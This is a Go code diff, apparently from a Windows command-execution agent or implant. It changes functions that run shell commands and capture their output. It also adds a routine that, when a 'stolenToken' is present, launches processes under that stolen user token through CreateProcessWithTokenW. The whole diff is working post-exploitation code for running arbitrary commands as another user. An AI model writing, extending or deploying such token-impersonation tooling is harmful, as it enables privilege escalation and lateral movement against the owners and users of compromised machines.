@@ -2,6 +2,7 @@ package command
 
 import (
 	"errors"
+	"fmt"
 	"golang.org/x/sys/windows"
 	"os"
 	"strings"
@@ -80,8 +81,10 @@ func RunNative(path string, args string) ([]byte, error) {
 	// create anonymous pipe
 	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
 	if err != nil {
-		return nil, err
+		return nil, errors.New(fmt.Sprintf("CreatePipe error: %s", err))
 	}
+	defer windows.CloseHandle(hWPipe)
+	defer windows.CloseHandle(hRPipe)
 
 	sI.Flags = windows.STARTF_USESTDHANDLES
 	sI.StdErr = hWPipe
@@ -98,38 +101,21 @@ func RunNative(path string, args string) ([]byte, error) {
 	} else {
 		return nil, errors.New("path is not null or %COMSPEC%")
 	}
-	err = windows.CreateProcess(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, 0, nil, nil, &sI, &pI)
+	err = CreateProcessNative(pathPtr, windows.StringToUTF16Ptr(args), nil, nil, true, 0, nil, nil, &sI, &pI)
 
 	if err != nil {
 		return nil, err
 	}
+	defer windows.CloseHandle(pI.Process)
+	defer windows.CloseHandle(pI.Thread)
 
 	_, _ = windows.WaitForSingleObject(pI.Process, windows.INFINITE)
 	_, _ = windows.WaitForSingleObject(pI.Thread, windows.INFINITE)
 
-	buf := make([]byte, 10*8192+1)
+	buf := make([]byte, 1024*8)
 	//var done uint32 = 4096
 	var read windows.Overlapped
 	_ = windows.ReadFile(hRPipe, buf, nil, &read)
-
-	//fmt.Printf("buf:%s\n", buf[:read.InternalHigh])
-
-	err = windows.CloseHandle(pI.Process)
-	if err != nil {
-		return nil, err
-	}
-	err = windows.CloseHandle(pI.Thread)
-	if err != nil {
-		return nil, err
-	}
-	err = windows.CloseHandle(hWPipe)
-	if err != nil {
-		return nil, err
-	}
-	err = windows.CloseHandle(hRPipe)
-	if err != nil {
-		return nil, err
-	}
 
 	return buf[:read.InternalHigh], nil
 }
@@ -140,5 +126,23 @@ func ExecNative(b []byte) error {
 
 	program, _ := windows.UTF16PtrFromString(string(b))
 	// when appName set to null, will use the first part of commandLine as the app, and rest as args
-	return windows.CreateProcess(nil, program, nil, nil, true, 0, nil, nil, &sI, &pI)
+	defer windows.CloseHandle(pI.Process)
+	defer windows.CloseHandle(pI.Thread)
+	return CreateProcessNative(nil, program, nil, nil, true, 0, nil, nil, &sI, &pI)
+}
+
+// if there is a token, use it to create new process
+func CreateProcessNative(appName *uint16, commandLine *uint16, procSecurity *windows.SecurityAttributes, threadSecurity *windows.SecurityAttributes, inheritHandles bool, creationFlags uint32, env *uint16, currentDir *uint16, startupInfo *windows.StartupInfo, outProcInfo *windows.ProcessInformation) error {
+	if isTokenValid {
+		_, _, err := createProcessWithTokenW.Call(uintptr(stolenToken), LOGON_WITH_PROFILE, uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(commandLine)), uintptr(creationFlags), uintptr(unsafe.Pointer(env)), uintptr(unsafe.Pointer(currentDir)), uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(outProcInfo)))
+		if err != nil && err != windows.SEVERITY_SUCCESS {
+			return errors.New(fmt.Sprintf("CreateProcessWithTokenW error: %s", err))
+		}
+	} else {
+		err := windows.CreateProcess(appName, commandLine, procSecurity, threadSecurity, inheritHandles, creationFlags, env, currentDir, startupInfo, outProcInfo)
+		if err != nil {
+			return errors.New(fmt.Sprintf("CreateProcess error: %s", err))
+		}
+	}
+	return nil
 }
